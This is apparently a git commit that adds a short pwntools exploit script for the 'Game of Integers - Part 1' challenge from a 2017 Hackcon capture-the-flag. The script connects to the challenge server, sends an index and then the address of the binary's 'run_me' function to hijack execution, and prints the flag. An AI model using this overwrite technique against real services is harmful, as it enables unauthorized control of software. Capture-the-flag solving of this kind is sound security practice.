35d37e45279666ec68955cafdb24b5dbd4f0e538
LeeYoungJoo <boright77@naver.com>
2017-02-12 11:14:47 +0900

    Create Game of Integers - Part 1.py

---
+++ 2017_Hackcon_Minipwn Write Up/Game of Integers - Part 1.py
@@ -0,0 +1,16 @@
+from pwn import *
+
+s = remote('35.154.158.26', 31338)
+e = ELF('./pwn100')
+
+def overwrite(msg):
+    s.recvline()
+    s.sendline(str(msg))
+
+s.recvline()
+s.sendline('24')
+
+overwrite(e.symbols['run_me'])
+
+s.recvline()
+print 'FLAG : ' + s.recv(1024)
